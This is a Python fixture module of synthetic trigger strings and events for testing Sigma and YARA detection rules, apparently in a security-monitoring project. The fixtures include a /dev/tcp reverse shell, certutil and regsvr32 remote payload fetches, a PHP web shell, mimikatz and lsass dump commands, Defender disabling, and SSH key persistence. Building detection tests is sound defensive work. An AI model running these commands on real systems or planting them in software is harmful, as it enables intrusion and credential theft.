"""Detection Content Expansion — Batch 1 fixture data (additive.

Synthetic positive/negative evaluation inputs for the 40 Batch-1 rules
(20 Sigma + 20 YARA) that are shipped in the repository rule set.  These
are **deterministic, harmless text markers and normalised-event builders**
used by the quality tests (:mod:`tests.unit.test_detection_content_batch1`)
and the rule-quality report generator (``scripts/detection_rule_quality_report.py``).

Every positive input exercises the exact selection/string surface of the
matching rule using supported fields and operators only.  No real malware,
no live infrastructure, no secrets — all credential-shaped strings use
``REDACTED`` placeholders or obviously synthetic marker text.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone

from app.schemas.normalized_event import (
    Actor,
    Endpoint,
    EventCategory,
    EventOutcome,
    NormalizedSecurityEvent,
    ProcessInfo,
)
from app.schemas.security_event import SourceType

# ---------------------------------------------------------------------------
# Batch 1 rule IDs
# ---------------------------------------------------------------------------

#: The 20 new Sigma rule ids (Batch 1) appended under ``rules/sigma/09..28``.
SIGMA_BATCH1_IDS: tuple[str, ...] = (
    "99999999-9999-4999-8999-999999999999",  # 09
    "10000000-0000-4000-8000-000000000000",  # 10
    "11000000-0000-4000-8000-000000000000",  # 11
    "12000000-0000-4000-8000-000000000000",  # 12
    "13000000-0000-4000-8000-000000000000",  # 13
    "14000000-0000-4000-8000-000000000000",  # 14
    "15000000-0000-4000-8000-000000000000",  # 15
    "16000000-0000-4000-8000-000000000000",  # 16
    "17000000-0000-4000-8000-000000000000",  # 17
    "18000000-0000-4000-8000-000000000000",  # 18
    "19000000-0000-4000-8000-000000000000",  # 19
    "20000000-0000-4000-8000-000000000000",  # 20
    "21000000-0000-4000-8000-000000000000",  # 21
    "22000000-0000-4000-8000-000000000000",  # 22
    "23000000-0000-4000-8000-000000000000",  # 23
    "24000000-0000-4000-8000-000000000000",  # 24
    "25000000-0000-4000-8000-000000000000",  # 25
    "26000000-0000-4000-8000-000000000000",  # 26
    "27000000-0000-4000-8000-000000000000",  # 27
    "28000000-0000-4000-8000-000000000000",  # 28
)

#: The 20 new YARA rule ids (Batch 1) appended under ``rules/yara/*.yar``.
YARA_BATCH1_IDS: tuple[str, ...] = (
    "yara-amsi-bypass-v1",
    "yara-defender-tamper-v1",
    "yara-reverse-shell-token-v1",
    "yara-lsass-dump-access-v1",
    "yara-run-key-persistence-v1",
    "yara-encoded-web-shell-v1",
    "yara-script-obfuscation-v1",
    "yara-sql-injection-probe-v1",
    "yara-xss-probe-v1",
    "yara-credential-exposure-v1",
    "yara-crypto-miner-v1",
    "yara-process-injection-v1",
    "yara-credential-dump-toolkit-v1",
    "yara-ssh-persistence-v1",
    "yara-web-config-leak-v1",
    "yara-office-macro-v1",
    "yara-lateral-movement-tool-v1",
    "yara-exfil-transfer-v1",
    "yara-keylogger-api-v1",
    "yara-phishing-lure-v1",
)

# ---------------------------------------------------------------------------
# Shared benign inputs (never match any Batch-1 rule)
# ---------------------------------------------------------------------------

#: Benign bytes for YARA negative evaluation (same line proven benign in the
#: shipped regression suite plus safe plaintext padding).
YARA_BENIGN_BYTES = (
    b"perfectly benign application log line "
    b"2026-09-23T10:00:00Z info service started successfully pid=1234"
)

#: Mapping of event categories used by each Batch-1 Sigma rule.
SIGMA_BATCH1_CATEGORY: dict[str, str] = {
    "11111111-1111-4111-8111-111111111111": "process",
    "22222222-2222-4222-8222-222222222222": "authentication",
    "33333333-3333-4333-8333-333333333333": "process",
    "44444444-4444-4444-8444-444444444444": "system",
    "55555555-5555-4555-8555-555555555555": "network",
    "66666666-6666-4666-8666-666666666666": "process",
    "77777777-7777-4777-8777-777777777777": "authentication",
    "88888888-8888-4888-8888-888888888888": "network",
    "99999999-9999-4999-8999-999999999999": "authentication",
    "10000000-0000-4000-8000-000000000000": "authentication",
    "11000000-0000-4000-8000-000000000000": "authentication",
    "12000000-0000-4000-8000-000000000000": "authentication",
    "13000000-0000-4000-8000-000000000000": "authentication",
    "14000000-0000-4000-8000-000000000000": "process",
    "15000000-0000-4000-8000-000000000000": "process",
    "16000000-0000-4000-8000-000000000000": "process",
    "17000000-0000-4000-8000-000000000000": "process",
    "18000000-0000-4000-8000-000000000000": "process",
    "19000000-0000-4000-8000-000000000000": "process",
    "20000000-0000-4000-8000-000000000000": "process",
    "21000000-0000-4000-8000-000000000000": "process",
    "22000000-0000-4000-8000-000000000000": "process",
    "23000000-0000-4000-8000-000000000000": "process",
    "24000000-0000-4000-8000-000000000000": "network",
    "25000000-0000-4000-8000-000000000000": "network",
    "26000000-0000-4000-8000-000000000000": "network",
    "27000000-0000-4000-8000-000000000000": "network",
    "28000000-0000-4000-8000-000000000000": "network",
}


def benign_event(rule_id: str) -> NormalizedSecurityEvent:
    """Return a benign normalised event for the given Batch-1 Sigma rule.

    Shares the rule's event category but carries none of its trigger
    values, so the rule must not fire (used for negative evaluation).
    """
    category = SIGMA_BATCH1_CATEGORY[rule_id]
    return NormalizedSecurityEvent(
        event_id=uuid.uuid4(),
        timestamp=datetime(2026, 1, 1, tzinfo=timezone.utc),
        event_category=EventCategory(category),
        action="routine_health_check",
        outcome=EventOutcome.UNKNOWN,
        source="tests",
        source_type=SourceType.OPERATING_SYSTEM,
        actor=Actor(username="svc-healthcheck"),
        normalized_data={},
    )


def positive_sigma_event(rule_id: str) -> NormalizedSecurityEvent:
    """Return a normalised event that must trigger the given Batch-1 rule."""
    return _make_sigma_event(**SIGMA_POSITIVES[rule_id])


# ---------------------------------------------------------------------------
# Sigma positive event builders
# ---------------------------------------------------------------------------


def _make_sigma_event(
    *,
    event_category: str,
    action: str | None = None,
    outcome: str = "success",
    username: str | None = None,
    normalized_data: dict | None = None,
    source_ip: str | None = None,
    source_hostname: str | None = None,
    source_port: int | None = None,
    destination_ip: str | None = None,
    destination_hostname: str | None = None,
    destination_port: int | None = None,
    destination_protocol: str | None = None,
    process_name: str | None = None,
    process_executable: str | None = None,
    process_command_line: str | None = None,
    process_parent: str | None = None,
) -> NormalizedSecurityEvent:
    outcome_enum = {
        "success": EventOutcome.SUCCESS,
        "failure": EventOutcome.FAILURE,
        "denied": EventOutcome.DENIED,
        "allowed": EventOutcome.ALLOWED,
        "unknown": EventOutcome.UNKNOWN,
    }[outcome]

    source_endpoint = None
    if source_ip or source_hostname or source_port:
        source_endpoint = Endpoint(
            ip=source_ip, hostname=source_hostname, port=source_port,
        )

    destination_endpoint = None
    if destination_ip or destination_hostname or destination_port or destination_protocol:
        destination_endpoint = Endpoint(
            ip=destination_ip,
            hostname=destination_hostname,
            port=destination_port,
            protocol=destination_protocol,
        )

    process = None
    if process_name or process_executable or process_command_line or process_parent:
        process = ProcessInfo(
            name=process_name,
            executable=process_executable,
            command_line=process_command_line,
            parent_process=process_parent,
        )

    return NormalizedSecurityEvent(
        event_id=uuid.uuid4(),
        timestamp=datetime(2026, 1, 1, tzinfo=timezone.utc),
        event_category=EventCategory(event_category),
        action=action,
        outcome=outcome_enum,
        source="tests",
        source_type=SourceType.OPERATING_SYSTEM,
        actor=Actor(username=username) if username else None,
        source_endpoint=source_endpoint,
        destination_endpoint=destination_endpoint,
        process=process,
        normalized_data=dict(normalized_data or {}),
    )


SIGMA_POSITIVES: dict[str, dict] = {
    "11111111-1111-4111-8111-111111111111": dict(  # 01 suspicious powershell
        event_category="process",
        process_name="powershell.exe",
        process_executable=(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        ),
        process_command_line="powershell.exe -enc AAAAAA",
    ),
    "22222222-2222-4222-8222-222222222222": dict(  # 02 repeated failed auth
        event_category="authentication",
        action="login",
        username="svc-test",
        outcome="failure",
    ),
    "33333333-3333-4333-8333-333333333333": dict(  # 03 suspicious process creation
        event_category="process",
        process_name="cmd.exe",
        process_executable=r"C:\Windows\System32\cmd.exe",
    ),
    "44444444-4444-4444-8444-444444444444": dict(  # 04 privilege escalation
        event_category="system",
        action="privilege escalation detected",
        outcome="success",
    ),
    "55555555-5555-4555-8555-555555555555": dict(  # 05 suspicious remote access
        event_category="network",
        action="rdp session established",
        outcome="success",
    ),
    "66666666-6666-4666-8666-666666666666": dict(  # 06 suspicious command exec
        event_category="process",
        process_name="certutil.exe",
        process_command_line="certutil -urlcache -split -f http://x/1.exe c:\\t\\1.exe",
    ),
    "77777777-7777-4777-8777-777777777777": dict(  # 07 service-account auth denied
        event_category="authentication",
        action="login",
        username="svc-backup$",
        outcome="denied",
    ),
    "88888888-8888-4888-8888-888888888888": dict(  # 08 suspicious network conn
        event_category="network",
        action="smb connection",
        outcome="success",
        destination_protocol="smb",
    ),
    "99999999-9999-4999-8999-999999999999": dict(  # 09 remote interactive admin
        event_category="authentication",
        action="network logon",
        username="CorpAdmin01",
        outcome="success",
        normalized_data={"logon_type": 10},
    ),
    "10000000-0000-4000-8000-000000000000": dict(  # 10 network logon failure
        event_category="authentication",
        action="network logon",
        username="appuser",
        outcome="failure",
        normalized_data={"logon_type": 3},
    ),
    "11000000-0000-4000-8000-000000000000": dict(  # 11 service account logon
        event_category="authentication",
        action="interactive logon",
        username="sqlsvc$",
        outcome="success",
    ),
    "12000000-0000-4000-8000-000000000000": dict(  # 12 anonymous/guest logon
        event_category="authentication",
        action="guest logon",
        username="guest",
        outcome="success",
    ),
    "13000000-0000-4000-8000-000000000000": dict(  # 13 RDP auth event
        event_category="authentication",
        outcome="success",
        normalized_data={"logon_type": 10},
        destination_port=3389,
    ),
    "14000000-0000-4000-8000-000000000000": dict(  # 14 scripting host -> powershell
        event_category="process",
        process_name="powershell.exe",
        process_executable=(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        ),
        process_parent=r"C:\Windows\System32\wscript.exe",
    ),
    "15000000-0000-4000-8000-000000000000": dict(  # 15 execution from temp
        event_category="process",
        process_name="stage.exe",
        process_executable=r"C:\Users\Public\AppData\Local\Temp\stage.exe",
    ),
    "16000000-0000-4000-8000-000000000000": dict(  # 16 proxy execution dll loader
        event_category="process",
        process_name="regsvr32.exe",
        process_executable=r"C:\Windows\System32\regsvr32.exe",
        process_command_line="regsvr32.exe /s /n /u /i:http://px.example/scrobj.dll",
    ),
    "17000000-0000-4000-8000-000000000000": dict(  # 17 scheduled task creation
        event_category="process",
        process_name="schtasks.exe",
        process_command_line="schtasks /create /sc onlogon /tn updater /tr calc.exe",
    ),
    "18000000-0000-4000-8000-000000000000": dict(  # 18 amsi bypass indicator
        event_category="process",
        process_name="powershell.exe",
        process_command_line="powershell -noprofile -Command AmsiInitFailed",
    ),
    "19000000-0000-4000-8000-000000000000": dict(  # 19 local credential dump
        event_category="process",
        process_name="reg.exe",
        process_command_line=r"reg.exe save hklm\sam C:\temp\sam.hiv",
    ),
    "20000000-0000-4000-8000-000000000000": dict(  # 20 network pivoting tool
        event_category="process",
        process_name="nc.exe",
        process_executable=r"C:\Tools\nc.exe",
    ),
    "21000000-0000-4000-8000-000000000000": dict(  # 21 recon commands
        event_category="process",
        process_name="cmd.exe",
        process_command_line="cmd /c ipconfig /all && net user",
    ),
    "22000000-0000-4000-8000-000000000000": dict(  # 22 office spawns script host
        event_category="process",
        process_name="cmd.exe",
        process_executable=r"C:\Windows\System32\cmd.exe",
        process_parent=(
            r"C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE"
        ),
    ),
    "23000000-0000-4000-8000-000000000000": dict(  # 23 webserver executes shell
        event_category="process",
        process_name="cmd.exe",
        process_executable=r"C:\Windows\System32\cmd.exe",
        process_parent=r"C:\xampp\apache\bin\httpd.exe",
        process_command_line="cmd.exe /c whoami",
    ),
    "24000000-0000-4000-8000-000000000000": dict(  # 24 admin service port
        event_category="network",
        destination_port=3389,
        destination_protocol="tcp",
    ),
    "25000000-0000-4000-8000-000000000000": dict(  # 25 IRC C2 port
        event_category="network",
        action="connection established",
        destination_port=6667,
        destination_protocol="tcp",
    ),
    "26000000-0000-4000-8000-000000000000": dict(  # 26 suspicious DNS TLD
        event_category="network",
        action="dns query",
        destination_hostname="redirector.example.xyz",
    ),
    "27000000-0000-4000-8000-000000000000": dict(  # 27 dynamic port
        event_category="network",
        destination_port=31337,
        destination_protocol="tcp",
    ),
    "28000000-0000-4000-8000-000000000000": dict(  # 28 firewall denied block rule
        event_category="network",
        outcome="denied",
        normalized_data={"rule_name": "block-outbound-traffic"},
    ),
}

# ---------------------------------------------------------------------------
# YARA positive byte fixtures
# ---------------------------------------------------------------------------

YARA_POSITIVES: dict[str, bytes] = {
    "yara-suspicious-script-v1": (
        b"var _0xabc = 'FAKE_VAL'; -windowstyle hidden"
    ),
    "yara-web-shell-v1": (
        b'<?php if(eval($_POST["c"])) { shell_exec($_GET["q"]); } ?>'
    ),
    "yara-credential-stealing-v1": (
        b"sekurlsa::logonpasswords mimikatz lsass.exe"
    ),
    "yara-powershell-artifact-v1": (
        b"powershell -EncodedCommand AAAA -NoProfile DownloadString"
    ),
    "yara-ransomware-marker-v1": (
        b"@Please_Read_Me@ your files have been encrypted, contact us for decryption"
    ),
    "yara-amsi-bypass-v1": (
        b"AMSIInitFailed scan disabled; patch amsi_patch hooks ETWProvider; "
        b"reference AmsiScanBuffer from amsi.dll"
    ),
    "yara-defender-tamper-v1": (
        b"Set-MpPreference -DisableRealtimeMonitoring -DisableBehaviorMonitoring; "
        b"stop WinDefend; SignatureUpdate suspended"
    ),
    "yara-reverse-shell-token-v1": (
        b"bash -i >& /dev/tcp/10.0.0.9/4444; nc -e /bin/sh; ncat -e /bin/bash; "
        b"final -c sh -i"
    ),
    "yara-lsass-dump-access-v1": (
        b"procdump.exe -ma lsass; MiniDumpWriteDump on pid; comsvcs.dll rundll32 "
        b"export to lsass.dmp"
    ),
    "yara-run-key-persistence-v1": (
        b"add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run plus "
        b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run entry; "
        b"copy to Programs\\Startup\\ folder; schtasks /create /tn stay"
    ),
    "yara-encoded-web-shell-v1": (
        b"if (@$_GET['cmd']) { echo chr(0x41); echo gzuncompress(''); "
        b"base64_decode(str_rot13($x)); create_function($y); }"
    ),
    "yara-script-obfuscation-v1": (
        b"eval(atob('dGVzdA==')); String.fromCharCode(72,73); "
        b"decodeURIComponent('%41'); function(p,a,c,k,e,r)"
    ),
    "yara-sql-injection-probe-v1": (
        b"' or '1'='1; union select 1; union all select 2; "
        b"from information_schema.tables; pg_sleep(9)"
    ),
    "yara-xss-probe-v1": (
        b"<script>alert(1)</script> <svg/onload=alert(1)> "
        b"<img src=x onerror=alert(1)> javascript:alert(1) <iframe srcdoc=payload>"
    ),
    "yara-credential-exposure-v1": (
        b"password=REDACTED; client_secret=REDACTED; api_key=REDACTED; "
        b"aws_secret_access_key=REDACTED; -----BEGIN PRIVATE KEY-----"
    ),
    "yara-crypto-miner-v1": (
        b"pool stratum+tcp://pool.mine.example:3333; xmrig config; cpuminer "
        b"launch; ethash algo; nicehash"
    ),
    "yara-process-injection-v1": (
        b"VirtualAllocEx + WriteProcessMemory + CreateRemoteThread; "
        b"NtCreateThreadEx; QueueUserAPC"
    ),
    "yara-credential-dump-toolkit-v1": (
        b"privilege::debug; lsass::dump; kerberos::golden; dcsync; sekurlsa::pth"
    ),
    "yara-ssh-persistence-v1": (
        b"echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys; cat .ssh/id_rsa; "
        b"touch .ssh/known_hosts; PermitRootLogin yes"
    ),
    "yara-web-config-leak-v1": (
        b".git/config leaked; connectionStrings; phpinfo(); server-status; "
        b"config.php.bak"
    ),
    "yara-office-macro-v1": (
        b"Private Sub Document_Open(); Auto_Open; DDEAUTO; AutoExec; AutoOpen()"
    ),
    "yara-lateral-movement-tool-v1": (
        b"psexec -s \\\\10.0.0.5; wmic /node:10.0.0.5; net use /user:DOMAIN\\joe; "
        b"schtasks /run /s 10.0.0.5; c$\\admin$"
    ),
    "yara-exfil-transfer-v1": (
        b"ftp -s:upload.scr; mput *.*; curl -F file=@data.zip; nc -lvp 4444; "
        b"python -m http.server 8080"
    ),
    "yara-keylogger-api-v1": (
        b"GetAsyncKeyState loop; SetWindowsHookEx WH_KEYBOARD_LL "
        b"LowLevelKeyboardProc; keybd_event replays"
    ),
    "yara-phishing-lure-v1": (
        b"Subject: Urgent Password Reset - Your password expires today. "
        b"Verify your account now. Your account has been locked. "
        b"Click here to login"
    ),
}